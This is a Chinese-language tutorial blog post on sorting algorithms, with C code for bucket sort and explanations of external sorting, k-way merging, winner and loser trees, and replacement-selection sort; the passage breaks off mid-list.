class="line"><span class="comment">// 桶排序，arr 为待排序序列</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">BucketSort</span><span class="params">(<span class="type">float</span> arr[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> **<span class="title">buckets</span>;</span></span><br><span class="line">    <span class="comment">// 创建所有桶</span></span><br><span class="line">    buckets = (<span class="keyword">struct</span> Node **)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node *) * NBUCKET);</span><br><span class="line">    <span class="comment">// 设置每个桶为空桶</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NBUCKET; ++i) &#123;</span><br><span class="line">        buckets[i] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 根据规定，将 arr 中的每个元素分散存储到各个桶中</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; ++i) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">current</span>;</span></span><br><span class="line">        <span class="type">int</span> pos = arr[i] * <span class="number">10</span>;  <span class="comment">//根据规则，确定元素所在的桶</span></span><br><span class="line">        <span class="comment">//创建存储该元素的存储块，并连接到指定的桶中</span></span><br><span class="line">        current = (<span class="keyword">struct</span> Node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">        current-&gt;data = arr[i];</span><br><span class="line">        current-&gt;next = buckets[pos];</span><br><span class="line">        buckets[pos] = current;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 调用自定义的排序算法，对各个桶进行排序</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NBUCKET; ++i) &#123;</span><br><span class="line">        buckets[i] = InsertionSort(buckets[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 合并所有桶内的元素</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>, i = <span class="number">0</span>; i &lt; NBUCKET; ++i) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">node</span>;</span></span><br><span class="line">        node = buckets[i];</span><br><span class="line">        <span class="keyword">while</span> (node) &#123;</span><br><span class="line">            arr[j++] = node-&gt;data;</span><br><span class="line">            node = node-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义的排序算法，用于对各个桶内元素进行排序</span></span><br><span class="line"><span class="keyword">struct</span> Node *<span class="title function_">InsertionSort</span><span class="params">(<span class="keyword">struct</span> Node *<span class="built_in">list</span>)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">k</span>, *<span class="title">nodeList</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">list</span> == <span class="literal">NULL</span> || <span class="built_in">list</span>-&gt;next == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    nodeList = <span class="built_in">list</span>;</span><br><span class="line">    k = <span class="built_in">list</span>-&gt;next;</span><br><span class="line">    nodeList-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span> (k != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">ptr</span>;</span></span><br><span class="line">        <span class="keyword">if</span> (nodeList-&gt;data &gt; k-&gt;data) &#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">tmp</span>;</span></span><br><span class="line">            tmp = k;</span><br><span class="line">            k = k-&gt;next;</span><br><span class="line">            tmp-&gt;next = nodeList;</span><br><span class="line">            nodeList = tmp;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (ptr = nodeList; ptr-&gt;next != <span class="number">0</span>; ptr = ptr-&gt;next) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ptr-&gt;next-&gt;data &gt; k-&gt;data)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ptr-&gt;next != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">tmp</span>;</span></span><br><span class="line">            tmp = k;</span><br><span class="line">            k = k-&gt;next;</span><br><span class="line">            tmp-&gt;next = ptr-&gt;next;</span><br><span class="line">            ptr-&gt;next = tmp;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            ptr-&gt;next = k;</span><br><span class="line">            k = k-&gt;next;</span><br><span class="line">            ptr-&gt;next-&gt;next = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nodeList;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="type">float</span> ar[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%.2f &quot;</span>, ar[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="外部排序"><a href="#外部排序" class="headerlink" title="外部排序"></a>外部排序</h2><h3 id="核心部分"><a href="#核心部分" class="headerlink" title="核心部分"></a>核心部分</h3><p><strong>1. 实现外部排序的两个过程：</strong></p>
<ul>
<li>将整个初始文件分为多个初始归并段;</li>
<li>将初始归并段进行归并，直至得到一个有序的完整文件；</li>
</ul>
<p><strong>2. 时间组成：</strong></p>
<ul>
<li>内部排序所需要的时间</li>
<li>外存信息读写所需要的时间 （关键）<br>  与归并的趟数有关<br>  k要大 —– 传统方法 会引起内部归并时间增大<br>  赢者树<br>败者树（目的：提高在k个归并串中当前值中找到最小值的效率）<br>m要小 —– 置换选择排序<br>Huffman（归并的顺序，对外存的I/O次数降到最低）</li>
<li>内部归并所需要的时间　　　　</li>
</ul>
<p><strong>3. 为了提高整个外部排序的效率，分别从以上两个方面对外部排序进行了优化：</strong></p>
<ul>
<li>在实现将初始文件分为 m 个初始归并段时，为了尽量减小 m 的值，<strong>采用置换-选择排序算法(内部使用败者树实现)</strong>，可实现将整个初始文件分为数量较少的长度不等的初始归并段。</li>
<li>同时在将初始归并段归并为有序完整文件的过程中，为了尽量减少读写外存的次数，采用<strong>构建最佳归并树的方式（哈夫曼树实现），对初始归并段进行归并（败者树实现）</strong>，而归并的具体实现方法是采用败者树的方式。</li>
</ul>
<p><strong>4. 优化递进顺序：</strong></p>
<ul>
<li>二路归并【因为硬盘的读写速度比内存要慢的多，按照以上这种方法，每个数据都从硬盘读了三次，写了三次，要花很多时间。考虑K路】</li>
<li>多路归并【K不是越大越好，因为K越大，在内部排序需要的时间越长，效率低。考虑减少初始顺串的数量M】</li>
<li>置换选择算法【可以用败者树和堆排序实现，得到多个长度不等的初始归并段，如何设置它们的归并顺序，可以使得对外存的访问次数降到最低? 考虑结合哈夫曼树】</li>
<li>最佳归并树（置换选择算法+哈夫曼树+多路归并+败者树）</li>
</ul>
<p><strong>5 胜者树 &amp; 败者树 &amp; 堆排序</strong></p>
<ul>
<li><strong>发展历史</strong><br>　　<strong>堆</strong>：其实一开始就是只有堆来完成多路归并的，但是人们发现堆每次取出最小值之后，把最后一个数放到堆顶，调整堆的时候，每次都要选出父节点的两个孩子节点的最小值，然后再用孩子节点的最小值和父节点进行比较，所以每调整一层需要比较两次。<br>　　<br>　　<strong>胜者树</strong>：这时人们想能否简化比较过程，这时就有了胜者树，这样每次比较只用跟自己的兄弟节点进行比较就好，所以用胜者树可以比堆少一半的比较次数。 而胜者树在节点上升的时候首选需要获得父节点，然后再获得兄弟节点，然后再比较。</li>
</ul>
<p><strong>败者树</strong>：这时人们又想能否再次减少比较次数，于是就有了败者树。在使用败者树的时候，每个新元素上升时，只需要获得父节点并比较即可。<br>　所以总的来说，减少了访存的时间。 现在程序的主要瓶颈在于访存了，计算倒几乎可以忽略不计了。</p>
<ul>
<li><p><strong>相同点</strong><br>首先它们三个的相同点就是在于：空间和时间复杂度都是一样的O(N*logN)。调整一次的时间复杂度都是O(logN)的。<br>所以这道题用堆来做，跟用败者树来做并没有本质上的算法复杂度量级上的差别。</p>
</li>
<li><p><strong>不同点</strong><br>　　<strong>堆</strong>：所有的节点都是关键字； 每次调整一层需要比较两次（父亲 左孩子|  父亲 右孩子）。<br>　　<br>　　<strong>胜者树</strong>：叶子节点是关键字，非叶子节点保存胜者索引；每次调整一层需要比较1次（自己 兄弟），读取两次（父亲| 兄弟）。</p>
</li>
</ul>
<p><strong>败者树</strong>：叶子节点是关键字，非叶子节点保存败者索引；每次调整一层需要比较1次（自己 父亲），读取一次（父亲），只需要和路径上的节点比较，不需要和兄弟节点比较，简化了重构的过程。； 新增B[0]记录比赛的胜者【在本例子中是ls[0]】</p>
<p><strong>6. 涉及到的算法：</strong></p>
<ul>
<li>多路归并算法</li>
<li>败者树选择算法</li>
<li>置换选择算法</li>
<li>哈夫曼树</li>
<li>内部排序算法（堆排序）</li>
</ul>
<h3 id="（一）定义"><a href="#（一）定义" class="headerlink" title="（一）定义"></a>（一）定义</h3><p>外部排序指的是大文件的排序，即待排序的记录存储在外存储器上，待排序的文件无法一次装入内存，需要在内存和外部存储器之间进行多次数据交换，以达到排序整个文件的目的。</p>
<h3 id="（二）步骤"><a href="#（二）步骤" class="headerlink" title="（二）步骤"></a>（二）步骤</h3><p>外部排序算法由两个阶段构成：预处理和合并排序。</p>
<ol>
<li><strong>预处理产生有序的顺串：</strong><br>按照内存大小，将外存上含有 n 个纪录的大文件分成若干长度为 t 的子文件（t 应小于内存的可使用容量），然后将各个子文件依次读入内存，使用适当的内部排序算法对子文件的 t 个纪录进行排序（排好序的子文件统称为“归并段”或者“顺段”），将排好序的归并段重新写入外存，为下一个子文件排序腾出内存空间；这样在外存上就得到了m个顺串（m=[n/t]）。</li>
<li><strong>合并序列：</strong><br>对得到的顺段进行合并，直至得到整个有序的文件为止。</li>
</ol>
<h3 id="（三）k-路平衡归并"><a href="#（三）k-路平衡归并" class="headerlink" title="（三）k-路平衡归并"></a>（三）<strong>k-路平衡归并</strong></h3><h4 id="1-2-路平衡归并"><a href="#1-2-路平衡归并" class="headerlink" title="1. 2-路平衡归并"></a>1. <strong>2-路平衡归并</strong></h4><p><strong>例子1</strong><br>给你一个包含20亿个int类型整数的文件，计算机的内存只有2GB，怎么给它们排序？一个int数占4个字节，20个亿需要80亿字节，大概占用8GB的内存，而计算机只有2GB的内存，数据都装不下！可以把8GB分割成4个2GB的数据来排，然后在把他们拼凑回去。</p>
<p>在2G内存中排序的时候可以选择合适的内部排序，比如快速排序或归并排序等算法。为了方便，我们把排序好的2G有序数据称为有序子串。接着把两个小的有序子串合并成一个大的有序子串。<br> <img src="https://img-blog.csdnimg.cn/20181126161926964.jpeg" alt=""></p>
<p>注意:读取的时候是每次读取一个int数，通过比较之后再输出。按照这个方法来回合并，总共经过三次合并之后就可以得到8G的有序子串。</p>
<p>我们假设需要排序的int数有12个，内存一次只能装下3个int数。接下来把12个数据分成4份，然后排序成有序子串：<br><img src="https://img-blog.csdnimg.cn/20181126161926984.jpeg" alt=""></p>
<p>然后把子串进行两两合并：输出哪个元素就在那个元素所在的有序子串再次读入一个元素：<br>继续<br><img src="https://img-blog.csdnimg.cn/2018112616192755.jpeg" alt=""></p>
<p>重复直到合并成一个包含6个int有序子串：<br><img src="https://img-blog.csdnimg.cn/2018112616192757.jpeg" alt=""></p>
<p>再把两个包含6个int的有序子串合并成一个包含12个int数据的最终有序子串。</p>
<blockquote>
<p>因为硬盘的读写速度比内存要慢的多，按照以上这种方法，每个数据都从硬盘读了三次，写了三次，要花很多时间。</p>
<p>解释下：例如对于数据2，我们把无序的12个数据分成有序的4个子串需要读写各一次，把2份3个有序子串合并成6个有序子串读写各一次；把2份6个有序子串合并从12个有序子串读写各一次，一共需要读写各3次。</p>
<p>在进行有序子串合并的时候，不采取两两合并的方法，而是可以3个子串，或4个子串一起来合并。</p>
</blockquote>
<p><strong>例子2</strong><br>例如，有一个含有 10000 个记录的文件，但是内存的可使用容量仅为 1000 个记录，毫无疑问需要使用外部排序算法，具体分为两步：</p>
<ul>
<li>将整个文件其等分为 10 个临时文件（每个文件中含有 1000 个记录），然后将这 10 个文件依次进入内存，采取适当的内存排序算法（快排或者归并排序）对其中的记录进行排序，将得到的有序文件（初始归并段）移至外存。</li>
<li>对得到的 10 个初始归并段进行如图 1 的两两归并，直至得到一个完整的有序文件。</li>
</ul>
<blockquote>
<p>注意：此例中采用了将文件进行等分的操作，还有不等分的算法，后面会介绍。</p>
</blockquote>
<p><img src="http://c.biancheng.net/uploads/allimg/190427/10593M623-0.png" alt=""><br>图 1 2-路平衡归并</p>
<p>如图 1 所示有 10 个初始归并段到一个有序文件，共进行了 4 次归并，每次都由 m 个归并段得到 ⌈m/2⌉ 个归并段，这种归并方式被称为 2-路平衡归并。</p>
<blockquote>
<p>注意：在实际归并的过程中，由于内存容量的限制不能满足同时将 2 个归并段全部完整的读入内存进行归并，只能不断地取 2 个归并段中的每一小部分进行归并，通过不断地读数据和向外存写数据，直至 2 个归并段完成归并变为 1 个大的有序文件。</p>
</blockquote>
<p><strong>对于外部排序算法来说，影响整体排序效率的因素主要取决于读写外存的次数，即访问外存的次数越多，算法花费的时间就越多，效率就越低。</strong></p>
<p>计算机中处理数据的为中央处理器（CPU），如若需要访问外存中的数据，只能通过将数据从外存导入内存，然后从内存中获取。同时由于内存读写速度快，外存读写速度慢的差异，更加影响了外部排序的效率。</p>
<p><strong>对于同一个文件来说，对其进行外部排序时访问外存的次数同归并的次数成正比，即归并操作的次数越多，访问外存的次数就越多</strong>。</p>
<h4 id="2-多路归并"><a href="#2-多路归并" class="headerlink" title="2. 多路归并"></a>2. 多路归并</h4><p><strong>对于同一个文件来说，对其进行外部排序时访问外存的次数同归并的次数成正比，即归并操作的次数越多，访问外存的次数就越多</strong>。3.1 中图 1 中使用的是 2-路平衡归并的方式，举一反三，还可以使用 3-路归并、4-路归并甚至是 10-路归并的方式。</p>
<p><strong>例子1</strong></p>
<p>我们假设内存一共可以装4个int型数据。</p>
<p>刚才我们是采取两两合并的方式，现在我们可以采取4个有序子串一起合并的方式，这样的话，每个数据从硬盘读写的次数各需要2次就可以了。如图：<br><img src="https://img-blog.csdnimg.cn/20181126161927115.jpeg" alt=""></p>
<p>4个有序子串的合并，叫4路归并。如果是n个有序子串的合并，就把它称为n路归并。n并非越大越好。N越大，内部排序所需要的时间越多。<br><strong>例子2</strong></p>
<p>图 2 为 5-路归并的方式：<br><img src="http://c.biancheng.net/uploads/allimg/190427/10593GY1-1.png" alt=""><br>图 2 5-路平衡归并</p>
<p>对比3.1 中 图 1 和 3.2 中图 2可以看出<strong>，对于 k-路平衡归并中 k 值得选择，增加 k 可以减少归并的次数，从而减少外存读写的次数，最终达到提高算法效率的目的。除此之外，一般情况下对于具有 m 个初始归并段进行 k-路平衡归并时，归并的次数为：s=⌊logk⁡m ⌋（其中 s 表示归并次数）。</strong></p>
<p><strong>从公式上可以判断出，想要达到减少归并次数从而提高算法效率的目的，可以从两个角度实现：  
</strong></p>
<ul>
<li><strong>增加 k-路平衡归并中的 k 值；[但不能影响内部归并的效率]</strong></li>
<li><strong>尽量减少初始归并段的数量 m，即增加每个归并段的容量；</strong></li>
</ul>
<blockquote>
<p><strong>其增加 k 值的想法引申出了一种外部排序算法：多路平衡归并算法；增加数量 m 的想法引申出了另一种外部排序算法：置换-选择排序算法。</strong></p>
</blockquote>
<h3 id="（四）多路平衡归并排序（胜者树、败者树）算法"><a href="#（四）多路平衡归并排序（胜者树、败者树）算法" class="headerlink" title="（四）多路平衡归并排序（胜者树、败者树）算法"></a>（四）多路平衡归并排序（胜者树、败者树）算法</h3><p><strong><font color="#ff0000">对于外部排序算法来说，其直接影响算法效率的因素为读写外存的次数，即次数越多，算法效率越低。若想提高算法的效率，即减少算法运行过程中读写外存的次数，可以增加 k –路平衡归并中的 k 值。但是经过计算得知，如果毫无限度地增加 k 值，虽然会减少读写外存数据的次数，但会增加内部归并的时间，得不偿失。</font></strong> <strong>（k越大，内部归并排序【比如选出最小值】需要花费更多的时间，所以k不是越大越好）</strong></p>
<p>例如在上节中，对于 10 个临时文件，当采用 2-路平衡归并时，若每次从 2 个文件中想得到一个最小值时只需比较 1 次；而采用 5-路平衡归并时，若每次从 5 个文件中想得到一个最小值就需要比较 4 次。以上仅仅是得到一个最小值记录，如要得到整个临时文件，其耗费的时间就会相差很大。</p>
<p>为了避免在增加 k 值的过程中影响内部归并的效率，在进行 k-路归并时可以使用“败者树”来实现，该方法在增加 k 值时不会影响其内部归并的效率。</p>
<p>胜者树和败者树都是完全二叉树（非叶子节点存储的是索引），他们是树形选择排序的变形（非叶子节点存储的是具体的值）。</p>
<h4 id="1-胜者树实现内部归并"><a href="#1-胜者树实现内部归并" class="headerlink" title="1. 胜者树实现内部归并"></a>1. 胜者树实现内部归并</h4><p>我们对胜者树进行定义：</p>
<ol>
<li>胜者树是一颗完全二叉树</li>
<li>胜者树的叶子结点保存我们的一个输入缓冲区（一路归并顺序表）；  叶节点L[ 1……n]</li>
<li>胜者树的非叶子节点保存当前比较的胜者的输入缓冲区的指针；非叶子节点B[1……n-1] //存储的是数组L的索引</li>
<li>胜者树的根节点保存我们的胜者树当前的的一次比较中的冠军（最优值） B[0]<br><img src="https://img2018.cnblogs.com/blog/728328/201905/728328-20190521171305804-2144743096.png" alt=""><br>　　　　<br>当我们将我们的胜者树的最优值输入到我们的输出缓冲区（<strong>输出缓冲区从内存中额外开辟出来的一段，我们存储当前的归并的结果，缓冲区满写入磁盘</strong>）之后，我们的根节点便出现了空的情况，<strong>我们需要从根节点对应的输入缓冲区中在读入一个数据来充当下一次比较的选手</strong>，然后<strong>从下到上进行维护</strong>，我们的每一次的维护都需要比较兄弟的胜者然后选出新一轮的胜者然后一直优化到我们的根的路径上（从低至上，贯穿整个树）之后我们不断地进行上述的操作，指导我们的所有的输入缓冲区已经为空为止。</li>
</ol>
<p><strong>例子：</strong> 胜者树的一个优点是，如果一个选手的值改变了，可以很容易地修改这棵胜者树。只需要沿着从该结点到根结点的路径修改这棵二叉树，而不必改变其他比赛的结果。</p>
<p>我们把胜者树分为两部分：<br>b[]：<code>用来保存K路数组的首元素，叶节点存放在此处，即底下那七个数组</code><br>ls[]：<code>用来保存胜者数组的下标，ls[1]是最终的胜者(即所求的数)。</code></p>
<p>胜者树的中间结点记录的是胜者的标号<br>胜者树的示例。规定数值小者胜。</p>
<p><img src="https://img-blog.csdn.net/2018052113140774?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2NzcxMjY5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>b3 PK b4，b3胜b4负，内部结点ls[4]的值为3；<br>b3 PK b0，b3胜b0负，内部结点ls[2]的值为3；<br>b1 PK b2，b1胜b2负，内部结点ls[3]的值为1；<br>b3 PK b1，b3胜b1负，内部结点ls[1]的值为3。</p>
<p>叶子结点b3的值变为11时，重构的胜者树如图所示<br><img src="https://img-blog.csdn.net/20180521131743865?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2NzcxMjY5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述">   </p>
<ol>
<li>b3 PK b4，b3胜b4负，内部结点ls[4]的值为3；</li>
<li>b3 PK b0，b0胜b3负，内部结点ls[2]的值为0；</li>
<li>b1 PK b2，b1胜b2负，内部结点ls[3]的值为1；</li>
<li>b0 PK b1，b1胜b0负，内部结点ls[1]的值为1。.</li>
</ol>
<h4 id="2-败者树实现内部归并"><a href="#2-败者树实现内部归并" class="headerlink" title="2. 败者树实现内部归并"></a>2. 败者树实现内部归并</h4><p>我们的胜者树维护的时候每次都需要去查找我们的根的兄弟节点的位置来进行比较，但是我们的每一次都要多一步查找兄弟的划，无论是对我们的程序的实现过程还是我们的时间效率上来看都还存在改进的余地。这里我们就要引入败者树，败者树与胜者树恰好相反，其双亲结点存储的是左右孩子比较之后的失败者，而胜利者则继续同其它的胜者去比较。</p>
<p>败者树的定义：</p>
<ol>
<li>败者树是一颗完全二叉树（败者树是树形选择排序的一种变形）</li>
<li>败者树的叶子结点保存的是我们的输入缓冲区</li>
<li>败者树的非叶子结点保存我们的当前的比较中败者的对应的输入缓冲区的指针</li>
<li>败者树根保存我们的当前比较的亚军，根上面还有一个节点保存我们的冠军</li>
</ol>
<p>比赛过程</p>
<ol>
<li>将新入树的节点与其父亲进行比较</li>
<li>把败者存放在父亲节点</li>
<li>把胜者再与上一级的父亲进行比赛</li>
<li>比赛不断进行</li>
<li>把败者的索引存放在B[1]</li>
<li>把胜者的索引放到节点B[0]</li>
</ol>
<p><strong>例子1：</strong><br>败者树是胜者树的一种变体。在败者树中，用父结点记录其左右子结点进行比赛的败者，而让胜者参加下一轮的比赛。败者树的根结点记录的是败者，需要加一个结点来记录整个比赛的胜利者。采用败者树可以简化重构的过程。</p>
<p>我们把败者树分为两部分：<br>b[]：<code>用来保存K路数组的首元素，叶节点存放在此处，即底下那七个数组</code><br>ls[]：<code>用来保存败者数组的下标，b[0]是最终的胜者(即所求的数)，败者节点存放在中间节点。</code><br>败者树的中间结点记录的败者的标号<br>败者树示例，规定数大者败。<br><img src="https://img-blog.csdn.net/20180521132227631?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2NzcxMjY5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p>
<p>b3 PK b4，b3胜b4负，内部结点ls[4]的值为4；<br>b3 PK b0，b3胜b0负，内部结点ls[2]的值为0；<br>b1 PK b2，b1胜b2负，内部结点ls[3]的值为2；<br>b3 PK b1，b3胜b1负，内部结点ls[1]的值为1；<br>在根结点ls[1]上又加了一个结点ls[0]=3，记录的最后的胜者。</p>
<p>败者树重构过程如下：将新进入选择树的结点与其父结点进行比赛：将败者存放在父结点中；而胜者再与上一级的父结点比较。比赛沿着到根结点的路径不断进行，直到ls[1]处。把败者存放在结点ls[1]中，胜者存放在ls[0]中。是当b3变为13时，败者树的重构图：<br><img src="https://img-blog.csdn.net/20180521132633556?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2NzcxMjY5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p>
<p>注意，败者树的重构跟胜者树是不一样的，败者树的重构只需要与其父结点比较。b3与结点ls[4]的原值比较，ls[4]中存放的原值是结点4，即b3与b4比较，b3负b4胜，则修改ls[4]的值为结点3。同理，以此类推，沿着根结点不断比赛，直至结束。</p>
<p><strong>例子2：</strong><br>例如还是图 1 中，叶子结点 49 和 38 比较，38 更小，所以 38 是胜利者，49 为失败者，但由于是败者树，所以其双亲结点存储的应该是 49；同样，叶子结点 65 和 97 比较，其双亲结点中存储的是 97 ，而 65 则用来同 38 进行比较，65 会存储到 97 和 49 的双亲结点的位置，38 继续做后续的胜者比较，依次类推。</p>
<blockquote>
<p><strong>胜者树和败者树的区别就是：胜者树中的非终端结点中存储的是胜利的一方；而败者树中的非终端结点存储的是失败的一方。而在比较过程中，都是拿胜者去比较。</strong></p>
</blockquote>
<p><img src="http://c.biancheng.net/uploads/allimg/190427/1100125I7-1.png" alt=""><br>图 2 败者树  </p>
<p>如图 2 所示为一棵 5-路归并的败者树，其中 <strong>b0—b4</strong> 为树的叶子结点，分别为 5 个归并段中存储的记录的关键字。<strong>ls</strong> 为一维数组，表示的是非终端结点，其中存储的数值表示第几归并段（例如 b0 为第 0 个归并段）。ls[0] 中存储的为最终的胜者，表示当前第 3 归并段中的关键字最小。</p>
<p>当最终胜者判断完成后，只需要更新叶子结点 b3 的值，即导入关键字 15，然后让<strong>该结点不断同其双亲结点所表示的关键字进行比较，败者留在双亲结点中，胜者继续向上比较。</strong></p>
<p>例如，叶子结点 15 先同其双亲结点 ls[4] 中表示的 b4 中的 12 进行比较，12 为胜利者，则 ls[4] 改为失败者 15 所在的归并段即 b3，然后 12 继续同 ls[2] 中表示的 10 做比较，10 为胜者，则 ls[2] 改为失败者 12 所在的归并段即 b4，然后 10 继续同其双亲结点 ls[1] 表示的 b1（关键字 9）作比较，最终 9 为胜者。整个过程如下图所示：<br><img src="http://c.biancheng.net/uploads/allimg/190427/1100123961-2.png" alt="">  </p>
<blockquote>
<p>注意：为了防止在归并过程中某个归并段变为空，处理的办法为：<strong>可以在每个归并段最后附加一个关键字为最大值的记录。这样当某一时刻选出的冠军为最大值时，表明 5 个归并段已全部归并完成。</strong>（因为只要还有记录，最终的胜者就不可能是附加的最大值）</p>
</blockquote>
<p>本节介绍了通过使用败者树来实现增加 k-路归并的规模来提高外部排序的整体效率。但是对于 k 值得选择也并不是一味地越大越好，而是需要综合考虑选择一个合适的 k 值。</p>
<h4 id="3-胜者树-amp-败者树-amp-堆排序"><a href="#3-胜者树-amp-败者树-amp-堆排序" class="headerlink" title="3. 胜者树 &amp; 败者树 &amp; 堆排序"></a>3. 胜者树 &amp; 败者树 &amp; 堆排序</h4><p><strong>发展历史</strong><br>　　<strong>堆</strong>：其实一开始就是只有堆来完成多路归并的，但是人们发现堆每次取出最小值之后，把最后一个数放到堆顶，调整堆的时候，每次都要选出父节点的两个孩子节点的最小值，然后再用孩子节点的最小值和父节点进行比较，所以每调整一层需要比较两次。<br>　　<strong>胜者树</strong>：这时人们想能否简化比较过程，这时就有了胜者树，这样每次比较只用跟自己的兄弟节点进行比较就好，所以用胜者树可以比堆少一半的比较次数。 而胜者树在节点上升的时候首选需要获得父节点，然后再获得兄弟节点，然后再比较。</p>
<p><strong>败者树</strong>：这时人们又想能否再次减少比较次数，于是就有了败者树。在使用败者树的时候，每个新元素上升时，只需要获得父节点并比较即可。 </p>
<p>　　所以总的来说，减少了访存的时间。 现在程序的主要瓶颈在于访存了，计算倒几乎可以忽略不计了。</p>
<p><strong>相同点</strong><br>首先它们三个的相同点就是在于：空间和时间复杂度都是一样的O(N*logN)。调整一次的时间复杂度都是O(logN)的。<br>所以这道题用堆来做，跟用败者树来做并没有本质上的算法复杂度量级上的差别。</p>
<p><strong>不同点</strong><br>　　<strong>堆</strong>：所有的节点都是关键字； 每次调整一层需要比较两次（父亲 左孩子|  父亲 右孩子）。<br>　　<strong>胜者树</strong>：叶子节点是关键字，非叶子节点保存胜者索引；每次调整一层需要比较1次（自己 兄弟），读取两次（父亲| 兄弟）。</p>
<p><strong>败者树</strong>：叶子节点是关键字，非叶子节点保存败者索引；每次调整一层需要比较1次（自己 父亲），读取一次（父亲），只需要和路径上的节点比较，不需要和兄弟节点比较，简化了重构的过程。； 新增B[0]记录比赛的胜者【在本例子中是ls[0]】</p>
<h3 id="（五）置换选择排序算法详解"><a href="#（五）置换选择排序算法详解" class="headerlink" title="（五）置换选择排序算法详解"></a>（五）置换选择排序算法详解</h3><p>k 不是越大越好，那么我们可以想办法减少有序子串的总个数 m。这样，也能减少数据从硬盘读写的次数。</p>
<p>上一节介绍了增加 k-路归并排序中的 k 值来提高外部排序效率的方法，而除此之外，还有另外一条路可走，<strong>即减少初始归并段的个数</strong>，也就是本章第一节中提到的减小 m 的值。</p>
<blockquote>
<p>m 的求值方法为：m=⌈n/l⌉（n 表示为外部文件中的记录数，l 表示初始归并段中包含的记录数）</p>
</blockquote>
<p>如果要想减小 m 的值，在外部文件总的记录数 n 值一定的情况下，只能增加每个归并段中所包含的记录数 l。而对于初始归并段的形成，就不能再采用上一章所介绍的内部排序的算法，因为所有的内部排序算法正常运行的前提是所有的记录都存在于内存中，而内存的可使用空间是一定的，如果增加 l 的值，内存是盛不下的。所以要另想它法，探索一种新的排序方法：置换—选择排序算法。</p>
<p><img src="https://img2018.cnblogs.com/blog/728328/201905/728328-20190521151117407-1614422312.png" alt=""><br><img src="https://img2018.cnblogs.com/blog/728328/201905/728328-20190521151205128-688921159.png" alt=""></p>
<p>例如已知初始文件中总共有 24 个记录，假设内存工作区最多可容纳 6 个记录，按照之前的选择排序算法最少也只能分为 4 个初始归并段。而如果使用置换—选择排序，可以实现将 24 个记录分为 3 个初始归并段，如图 1 所示：<br><img src="http://c.biancheng.net/uploads/allimg/190427/1100441347-0.png" alt=""></p>
<p>置换—选择排序算法的具体操作过程为：</p>
<ol>
<li>首先从初始文件中输入 6 个记录到内存工作区中；</li>
<li>从内存工作区中选出关键字最小的记录，将其记为 MINIMAX 记录；</li>
<li>然后将 MINIMAX 记录输出到归并段文件中；</li>
<li>此时内存工作区中还剩余 5 个记录，若初始文件不为空，则从初始文件中输入下一个记录到内存工作区中；</li>
<li>从内存工作区中的所有比 MINIMAX 值大的记录中选出值最小的关键字的记录，作为新的 MINIMAX 记录；[使用败者树或者堆排序实现]</li>
<li>重复过程 3—5，直至在内存工作区中选不出新的 MINIMAX 记录为止，由此就得到了一个初始归并段；</li>
